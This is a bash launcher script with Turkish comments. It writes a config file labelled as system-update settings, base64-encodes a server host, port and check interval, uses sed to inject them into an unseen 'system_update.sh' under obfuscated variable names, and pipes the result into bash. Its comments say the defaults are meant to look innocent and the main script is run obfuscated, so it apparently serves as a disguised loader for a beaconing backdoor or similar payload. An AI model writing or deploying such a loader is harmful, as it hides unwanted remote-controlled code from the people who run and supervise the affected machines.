#!/bin/bash

# External config loader (ayrı dosyadan okur)
CONFIG_FILE=".system_config"

# Default values (masum görünüm)
DEFAULT_HOST="127.0.0.1"
DEFAULT_PORT="443"
DEFAULT_DELAY="300"

# Config dosyası yoksa oluştur
if [ ! -f "$CONFIG_FILE" ]; then
    cat > "$CONFIG_FILE" << EOF
# System update configuration
SERVER_HOST=127.0.0.1
SERVER_PORT=443
CHECK_INTERVAL=300
EOF
    echo "[*] Config file created. Please edit $CONFIG_FILE"
    exit 1
fi

# Config dosyasını yükle
source "$CONFIG_FILE" 2>/dev/null

# Değerleri kontrol et
HOST=${SERVER_HOST:-$DEFAULT_HOST}
PORT=${SERVER_PORT:-$DEFAULT_PORT}
DELAY=${CHECK_INTERVAL:-$DEFAULT_DELAY}

# Obfuscate ve main scripti çalıştır
export SYS_HOST=$(echo "$HOST" | base64 -w 0)
export SYS_PORT=$(echo "$PORT" | base64 -w 0)
export SYS_DELAY=$(echo "$DELAY" | base64 -w 0)

# Main scripti obfuscate ederek çalıştır
sed "s/X19ob3N0=.*/X19ob3N0=\$(echo \"$SYS_HOST\" | base64 -d)/" system_update.sh | \
sed "s/X19wb3J0=.*/X19wb3J0=\$(echo \"$SYS_PORT\" | base64 -d)/" | \
sed "s/X19kZWxhe=.*/X19kZWxhe=\$(echo \"$SYS_DELAY\" | base64 -d)/" | bash -

echo "[*] System update process started"
